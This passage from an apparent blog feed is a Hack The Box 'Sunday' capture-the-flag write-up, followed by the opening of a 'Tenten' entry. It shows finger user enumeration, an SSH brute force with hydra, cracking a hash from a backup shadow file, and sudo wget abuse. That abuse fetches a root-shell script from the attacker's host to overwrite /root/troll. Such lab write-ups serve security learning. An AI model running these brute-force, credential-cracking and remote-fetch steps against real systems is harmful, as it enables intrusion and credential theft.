</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sunday curl -Ok http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
_  sunday ./finger-user-enum.pl -t 10.10.10.76 -U /opt/SecLists/Usernames/Names/names.txt -m <span style="color:#bd93f9">50</span>
Starting finger-user-enum v1.0 <span style="color:#ff79c6">(</span> http://pentestmonkey.net/tools/finger-user-enum <span style="color:#ff79c6">)</span>

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... <span style="color:#bd93f9">50</span>
Usernames file ........... /opt/SecLists/Usernames/Names/names.txt
Target count ............. <span style="color:#bd93f9">1</span>
Username count ........... <span style="color:#bd93f9">10163</span>
Target TCP port .......... <span style="color:#bd93f9">79</span>
Query timeout ............ <span style="color:#bd93f9">5</span> secs
Relay Server ............. Not used

<span style="color:#6272a4">######## Scan started at Sat Sep 19 17:43:43 2020 #########</span>
...
sammy@10.10.10.76: sammy                 console      &lt;Jul <span style="color:#bd93f9">31</span> 17:59&gt;..
sunny@10.10.10.76: sunny                 pts/3        &lt;Apr 24, 2018&gt; 10.10.14.4          ..
...
<span style="color:#6272a4">######## Scan completed at Sat Sep 19 17:45:43 2020 #########</span>
<span style="color:#bd93f9">14</span> results.

<span style="color:#bd93f9">10163</span> queries in <span style="color:#bd93f9">120</span> seconds <span style="color:#ff79c6">(</span>84.7 queries / sec<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>We can now try to bruteforce with <code>hydra</code>, however it&rsquo;s gonna take ages with a large password dictionnary, so maybe we try instead to craft a small dictionary with some easy guess such as hostname and default passwords</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sunday hydra -L users.txt -P passwords.txt ssh://10.10.10.76:22022
</code></pre></td></tr></table>
</div>
</div><pre tabindex="0"><code>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-19 18:45:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:2/p:3), ~1 try per task
[DATA] attacking ssh://10.10.10.76:22022/
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-19 18:46:26
</code></pre><p>We found sunny:sunday , however my ssh-client cannot negotiate a cypher supported by the SSH server</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sunday ssh -p <span style="color:#bd93f9">22022</span> sunny@10.10.10.76
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g<span style="color:#ff79c6">==</span>,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
</code></pre></td></tr></table>
</div>
</div><p>We can force the key exchange algorithm</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  .ssh ssh -p <span style="color:#bd93f9">22022</span> -oKexAlgorithms<span style="color:#ff79c6">=</span>+diffie-hellman-group1-sha1  sunny@10.10.10.76
Password:
Last login: Sat Sep <span style="color:#bd93f9">19</span> 16:20:07 <span style="color:#bd93f9">2020</span> from 10.10.14.38
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November <span style="color:#bd93f9">2008</span>
sunny@sunday:~$ <span style="color:#8be9fd;font-style:italic">pwd</span>
/export/home/sunny
sunny@sunday:~$ id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>65535<span style="color:#ff79c6">(</span>sunny<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>1<span style="color:#ff79c6">(</span>other<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>1<span style="color:#ff79c6">(</span>other<span style="color:#ff79c6">)</span>
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> NOPASSWD: /root/troll
sunny@sunday:~$ sudo /root/troll
testing
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><p>sunny can execute /root/troll as sudo, but we can&rsquo;t do much without another attack</p>
<p>We can find a backup copy of the shadow file, which contains password hash for user sammy</p>
<pre tabindex="0"><code>sunny@sunday:~$ ls /backup
agent22.backup  shadow.backup
sunny@sunday:~$ cat /backup/shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:~$
</code></pre><p>We copy for john the ripper</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  sunday <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::&#39;</span> &gt; crack.txt
_  sunday /opt/john/run/john --wordlist<span style="color:#ff79c6">=</span>/opt/dictionaries/rockyou.txt crack.txt
Using default input encoding: UTF-8
Loaded <span style="color:#bd93f9">1</span> password <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">(</span>sha256crypt, crypt<span style="color:#ff79c6">(</span>3<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">$5</span>$ <span style="color:#ff79c6">[</span>SHA256 128/128 AVX 4x<span style="color:#ff79c6">])</span>
Cost <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>iteration count<span style="color:#ff79c6">)</span> is <span style="color:#bd93f9">5000</span> <span style="color:#ff79c6">for</span> all loaded hashes
Will run <span style="color:#bd93f9">4</span> OpenMP threads
Press <span style="color:#f1fa8c">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff79c6">for</span> status
cooldude!        <span style="color:#ff79c6">(</span>sammy<span style="color:#ff79c6">)</span>
1g 0:00:00:44 DONE <span style="color:#ff79c6">(</span>2020-09-19 19:00<span style="color:#ff79c6">)</span> 0.02269g/s 4624p/s 4624c/s 4624C/s dominique15..chronic69
Use the <span style="color:#f1fa8c">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></td></tr></table>
</div>
</div><p>sammy:cooldude!</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  .ssh ssh -p <span style="color:#bd93f9">22022</span> -oKexAlgorithms<span style="color:#ff79c6">=</span>+diffie-hellman-group1-sha1  sammy@10.10.10.76
Password:
Last login: Sat Sep <span style="color:#bd93f9">19</span> 16:34:56 <span style="color:#bd93f9">2020</span> from 10.10.14.38
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November <span style="color:#bd93f9">2008</span>
sammy@sunday:~$ ls
Desktop  Documents  Downloads  Public
sammy@sunday:~$ <span style="color:#8be9fd;font-style:italic">cd</span> Deskto
sammy@sunday:~$ ls Desktop
user.txt
sammy@sunday:~$ cat Desktop/user.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="root-flag-without-privilege-escalation">root flag without privilege escalation</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sammy@sunday:~$ sudo -l
User sammy may run the following commands on this host:
    <span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> NOPASSWD: /usr/bin/wget
</code></pre></td></tr></table>
</div>
</div><p>As we know which file we are looking for, The easiest way to get the root flag is:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sammy@sunday:~$ sudo wget -i /root/root.txt
//root/root.txt: Invalid URL <span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>: Unsupported scheme
No URLs found in /root/root.txt.
</code></pre></td></tr></table>
</div>
</div><h1 id="privilege-escalation">privilege escalation</h1>
<p>The attack path is:</p>
<ol>
<li>sunny is allowed to execute dummy /root/troll with sudo</li>
<li>if we can overwrite /root/troll to get a shell, then we can become root</li>
<li>sammy has the ability to download as root with sudo</li>
<li>Then sammy can overwrite /root/troll with <code>sudo wget http://... -O /root/troll</code></li>
<li>in fact sunny will execute a crafted script that sammy will wget to overwrite /root/troll</li>
<li>the crafted script will open a shell as root</li>
</ol>
<p>We can craft a script, and prepare the http server for the upload</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@014202efa8c8:~/htb/sunday/http$ mkdir http  <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#8be9fd;font-style:italic">cd</span> http
ctf@014202efa8c8:~/htb/sunday/http$ cat <span style="color:#f1fa8c">&lt;&lt; EOF &gt; crafted.sh
</span><span style="color:#f1fa8c">&gt; #!/bin/bash
</span><span style="color:#f1fa8c">&gt; /bin/bash
</span><span style="color:#f1fa8c">&gt; EOF</span>
ctf@014202efa8c8:~/htb/sunday/http$ cat crafted.sh
<span style="color:#6272a4">#!/bin/bash</span>
/bin/bash
ctf@014202efa8c8:~/htb/sunday/http$ sudo python3 -m http.server <span style="color:#bd93f9">80</span>
<span style="color:#ff79c6">[</span>sudo<span style="color:#ff79c6">]</span> password <span style="color:#ff79c6">for</span> ctf:
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:80/<span style="color:#ff79c6">)</span> ...
</code></pre></td></tr></table>
</div>
</div><p>| We have to be very fast because the /root/troll is restored every seconds</p>
<p>As user sammy:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sammy@sunday:~$ sudo wget http://10.10.14.38/craft.sh -O /root/troll
--17:17:14--  http://10.10.14.38/craft.sh
           <span style="color:#ff79c6">=</span>&gt; <span style="color:#f1fa8c">`</span>/root/troll<span style="color:#f1fa8c">&#39;
</span><span style="color:#f1fa8c">Connecting to 10.10.14.38:80... connected.
</span><span style="color:#f1fa8c">HTTP request sent, awaiting response... 200 OK
</span><span style="color:#f1fa8c">Length: 22 [text/x-sh]
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">100%[==========================================================================&gt;] 22            --.--K/s
</span><span style="color:#f1fa8c">
</span><span style="color:#f1fa8c">17:17:14 (5.61 KB/s) - `/root/troll&#39;</span> saved <span style="color:#ff79c6">[</span>22/22<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>As user sunny:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sunny@sunday:~$ sudo /root/troll
root@sunday:~# id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>,1<span style="color:#ff79c6">(</span>other<span style="color:#ff79c6">)</span>,2<span style="color:#ff79c6">(</span>bin<span style="color:#ff79c6">)</span>,3<span style="color:#ff79c6">(</span>sys<span style="color:#ff79c6">)</span>,4<span style="color:#ff79c6">(</span>adm<span style="color:#ff79c6">)</span>,5<span style="color:#ff79c6">(</span>uucp<span style="color:#ff79c6">)</span>,6<span style="color:#ff79c6">(</span>mail<span style="color:#ff79c6">)</span>,7<span style="color:#ff79c6">(</span>tty<span style="color:#ff79c6">)</span>,8<span style="color:#ff79c6">(</span>lp<span style="color:#ff79c6">)</span>,9<span style="color:#ff79c6">(</span>nuucp<span style="color:#ff79c6">)</span>,12<span style="color:#ff79c6">(</span>daemon<span style="color:#ff79c6">)</span>
root@sunday:~# cat /root/root.txt
<span style="color:#ff79c6">[</span>REDACTED<span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Tenten</title><link>https://0xade1.github.io/posts/2020/09/htb-tenten/</link><pubDate>Sat, 19 Sep 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/09/htb-tenten/</guid><description>nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Nmap 7.60 scan initiated Fri Feb 28 10:29:31 2020 as: nmap -sC -sV -oA nmap/tenten 10.10.10.10 Nmap scan report for tenten.htb (10.10.10.10) Host is up (0.24s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA) | 256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA) |_ 256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (EdDSA) 80/tcp open http Apache httpd 2.</description><content type="html"><![CDATA[<h1 id="nmap">nmap</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
